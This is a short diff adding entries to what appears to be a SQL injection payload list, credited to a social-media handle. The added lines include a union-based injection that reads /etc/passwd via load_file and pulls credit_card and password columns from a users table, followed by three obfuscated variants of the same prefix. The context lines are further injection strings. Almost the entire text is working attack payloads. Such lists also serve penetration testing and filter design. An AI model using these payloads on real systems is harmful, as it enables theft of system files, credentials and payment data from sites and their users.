@@ -346,4 +346,8 @@ true is not unknown for update union select table_name from information_schema.t
 
 (1 AND 1) OR 2>1--
 
-
+# ht/@FluxReiners
+'-(1 or 1) and 1=0 union select load_file('/etc/passwd'),credit_card,password from users-- -
+'-(-1 or -1) and 1=0 union
+'-(-(1) or -1) and 1=0 union
+'-((1) or -1) and 1=0 union
